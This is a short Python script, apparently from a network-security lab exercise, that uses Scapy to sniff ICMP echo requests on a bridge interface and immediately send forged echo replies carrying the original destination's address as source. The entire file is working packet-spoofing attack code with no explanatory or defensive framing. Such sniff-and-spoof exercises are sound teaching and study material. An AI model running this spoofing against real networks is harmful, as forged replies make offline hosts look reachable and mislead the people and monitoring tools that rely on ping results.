#!/usr/bin/env python3
import socket
from scapy.all import *

def create_icmp_reply(src_ip, dst_ip, icmp_id, icmp_seq, payload):
    ip_header = IP(src=src_ip, dst=dst_ip)
    icmp_reply = ICMP(type=0, id=icmp_id, seq=icmp_seq)
    return ip_header / icmp_reply / Raw(load=payload)

def spoof_icmp(packet):
    if ICMP in packet and packet[ICMP].type == 8:
        print(f"Sniffed ICMP request from {packet[IP].src} to {packet[IP].dst}")
        packet.show()
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        spoofed_packet = create_icmp_reply(
            src_ip=packet[IP].dst,  
            dst_ip=packet[IP].src,  
            icmp_id=packet[ICMP].id,
            icmp_seq=packet[ICMP].seq,
            payload=packet[Raw].load
        )

        sock.sendto(bytes(spoofed_packet), (packet[IP].src, 0))
        print(f"Sent spoofed ICMP reply from {packet[IP].dst} to {packet[IP].src}")
        spoofed_packet.show()

sniff(filter="icmp", prn=spoof_icmp, iface="br-5717e1d9934a")
